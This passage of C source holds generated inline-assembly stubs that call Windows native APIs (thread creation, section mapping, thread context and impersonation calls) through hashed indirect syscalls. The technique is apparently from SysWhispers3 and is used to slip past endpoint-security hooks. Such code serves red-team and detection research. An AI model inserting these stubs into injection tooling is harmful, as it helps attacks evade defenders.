        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0xE830236E \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtCreateThreadEx(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x113F55E3 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x113F55E3 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtDeleteKey(
    IN HANDLE KeyHandle)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x6BDA0E04 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x6BDA0E04 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtPrivilegeCheck(
    IN HANDLE ClientToken,
    IN OUT PPRIVILEGE_SET RequiredPrivileges,
    OUT PBOOL Result)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x12B1DE10 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x12B1DE10 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtCreateEvent(
    OUT PHANDLE EventHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN EVENT_TYPE EventType,
    IN BOOLEAN InitialState)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x10893520 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x10893520 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtTerminateThread(
    IN HANDLE ThreadHandle,
    IN NTSTATUS ExitStatus)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x381B3AB5 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x381B3AB5 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS _NtFsControlFile(
    IN HANDLE FileHandle,
    IN HANDLE Event OPTIONAL,
    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
    IN PVOID ApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG FsControlCode,
    IN PVOID InputBuffer OPTIONAL,
    IN ULONG InputBufferLength,
    OUT PVOID OutputBuffer OPTIONAL,
    IN ULONG OutputBufferLength)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x20C6D09C \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x20C6D09C \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtGetContextThread(
    IN HANDLE ThreadHandle,
    IN OUT PCONTEXT ThreadContext)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0xBA9EF43C \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0xBA9EF43C \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtSetContextThread(
    IN HANDLE ThreadHandle,
    IN PCONTEXT Context)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0xCB668D44 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0xCB668D44 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtResumeThread(
    IN HANDLE ThreadHandle,
    IN OUT PULONG PreviousSuspendCount OPTIONAL)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x1339598F \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x1339598F \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtDelayExecution(
    IN BOOLEAN Alertable,
    IN PLARGE_INTEGER DelayInterval)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0xB6EB75BA \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0xB6EB75BA \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtGetNextThread(
    IN HANDLE ProcessHandle,
    IN HANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN ULONG HandleAttributes,
    IN ULONG Flags,
    OUT PHANDLE NewThreadHandle)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x1BB0D9EF \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x1BB0D9EF \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS _NtQueryInformationThread(
    IN HANDLE ThreadHandle,
    IN THREADINFOCLASS ThreadInformationClass,
    OUT PTHREAD_BASIC_INFORMATION ThreadInformation,
    IN ULONG ThreadInformationLength,
    OUT PULONG ReturnLength OPTIONAL)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x0ACD84E7 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x0ACD84E7 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtOpenThread(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN PCLIENT_ID ClientId OPTIONAL)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x36960437 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x36960437 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtMapViewOfSection(
    IN HANDLE SectionHandle,
    IN HANDLE ProcessHandle,
    IN OUT PVOID BaseAddress,
    IN ULONG ZeroBits,
    IN SIZE_T CommitSize,
    IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
    IN OUT PSIZE_T ViewSize,
    IN SECTION_INHERIT InheritDisposition,
    IN ULONG AllocationType,
    IN ULONG Win32Protect)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x7A2D5C79 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x7A2D5C79 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtUnmapViewOfSection(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0xCA1ACC8F \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0xCA1ACC8F \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtImpersonateThread(
    IN HANDLE ThreadHandle,
    IN HANDLE ThreadToImpersonate,
    IN PSECURITY_QUALITY_OF_SERVICE SecurityQualityOfService)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x0C26D619 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x0C26D619 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}


#endif
